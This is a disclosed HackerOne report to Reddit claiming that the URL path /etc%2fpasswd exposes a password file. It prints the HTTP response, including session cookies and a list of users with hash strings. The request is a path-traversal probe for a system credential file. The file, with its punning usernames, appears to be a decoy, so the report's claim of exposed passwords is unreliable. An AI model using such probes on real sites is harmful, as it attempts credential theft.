# critical file found etc/passwd on www.reddit.com

## Report Details
- **Report ID**: 1187003
- **URL**: https://hackerone.com/reports/1187003
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-05-06T19:23:35.234Z
- **Disclosed**: 2021-10-21T19:54:55.412Z

## Reporter
- **Username**: himan253
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
1.go to this link https://www.reddit.com/etc%2fpasswd
2.youll find all the etc/passwd   files this data should be protected.
3.these passwd can be used for many illegal purpose and can damage the comapny 
poc attched:
HTTP/2 200 OK
Content-Type: text/plain; charset=UTF-8
X-Ua-Compatible: IE=edge
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Cache-Control: max-age=0, must-revalidate
X-Moose: majestic
Accept-Ranges: bytes
Date: Thu, 06 May 2021 19:04:28 GMT
Via: 1.1 varnish
Vary: accept-encoding
Set-Cookie: loid=0000000000bz6qw076.2.1620327868031.Z0FBQUFBQmdsRDI4Q1NBY21wZmZ6MGlydUE3SllQbkRzNzR4UDVGMkI2QjVjWHVJR05aOFVrY1RvS3Fmdm40aDlvMXM0VzdGWkdFaEZDaTdNcUZwOVBlX294VWJuY1lxb0R5Uzdxa2ZxQ21Ra0lkaXZvb1BoYWNJUmpGRVNVTUNUSlpmbmVLYV9RUkM; Domain=reddit.com; Max-Age=63071999; Path=/; expires=Sat, 06-May-2023 19:04:28 GMT; secure; SameSite=None; Secure
Set-Cookie: session_tracker=dAuhcStLE0ABOIbbQG.0.1620327868031.Z0FBQUFBQmdsRDI4MUJpdTFveEM5RzFONlpmQVBNRTFrUU9EZTExODF3MzUwZjIxNGNiODBUaWYtQW1pakNCZFA2eWhWcEVHbmh0N1dlTVNFdEE0NkhPbmdMOE54YjRQeUp4T1ZUc1JmRlVfMER2VzhoTFd4amlzQWlldkZqcG9uVzBKSkR4cTB6LVM; Domain=reddit.com; Max-Age=7199; Path=/; expires=Thu, 06-May-2021 21:04:28 GMT; secure; SameSite=None; Secure
Set-Cookie: csv=1; Max-Age=63072000; Domain=.reddit.com; Path=/; Secure; SameSite=None
Set-Cookie: edgebucket=JJxiXzjqsnVU7EAuE7; Domain=reddit.com; Max-Age=63071999; Path=/;  secure
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Server: snooserv
Content-Length: 1523

root:*:16583:0:99999:7:::
daemon:*:16583:0:99999:7:::
bin:*:16583:0:99999:7:::
sys:*:16583:0:99999:7:::
sync:*:16583:0:99999:7:::
games:*:16583:0:99999:7:::
man:*:16583:0:99999:7:::
lp:*:16583:0:99999:7:::
mail:*:16583:0:99999:7:::
news:*:16583:0:99999:7:::
uucp:*:16583:0:99999:7:::
proxy:*:16583:0:99999:7:::
www-data:*:16583:0:99999:7:::
backup:*:16583:0:99999:7:::
list:*:16583:0:99999:7:::
irc:*:16583:0:99999:7:::
gnats:*:16583:0:99999:7:::
nobody:*:16583:0:99999:7:::
libuuid:!:16583:0:99999:7:::
syslog:*:16583:0:99999:7:::
messagebus:*:16583:0:99999:7:::
landscape:*:16583:0:99999:7:::
sshd:*:16583:0:99999:7:::
pollinate:*:16583:0:99999:7:::
puppet:*:16584:0:99999:7:::
memcache:!:16727:0:99999:7:::
ntp:*:16727:0:99999:7:::
snmp:*:16727:0:99999:7:::
spez:$1$$GbK4WZMpXZgmYlQ+H3/68Q==:16727:0:99999:7:::
daniel:$1$$X03MO1qnZdYdgyfeuILPmQ==:16727:0:99999:7:::
spladug:$1$$Xee7PCMnQfRh88zRPBunoA==:16727:0:99999:7:::
neil:$1$$KrljkMfb40Od500MmwsXZw==:16727:0:99999:7:::
neal:$1$$Xr4ilOzQ4PCOq3aQ0qbuaQ==:16727:0:99999:7:::
sam:$1$$BtgOsMULSaUJtJ8kJOjIBQ==:16727:0:99999:7:::
neel:$1$$0HfyRN74pw5ep1i9g1L82A==:16727:0:99999:7:::
kneel:$1$$g+Spau2WQ2xiG5gJ4lizCQ==:16727:0:99999:7:::
kevin:$1$$yOjfiVwsrhZrrQJ/3xUzWw==:16727:0:99999:7:::
kavin:$1$$31PKJoJAynZnDIVm7lRWig==:16727:0:99999:7:::
kovin:$1$$G43Qgw1Fk6OIrzganMC2WA==:16727:0:99999:7:::
powerlanguage:$1$$A9kE9Zud+aPy76hqmMj3lQ==:16727:0:99999:7:::
robin:$1$$q67PjKP5jcE+7susJjzT7Q==:16727:0:99999:7:::
justin:$1$$zRTDI5AgJOcshQqoKNY0pw==:16727:0:99999:7:::

## Impact

all the password and data publicly available

## Attachments
- 1.PNG
- 2.PNG
- recording-1620328851650.webm
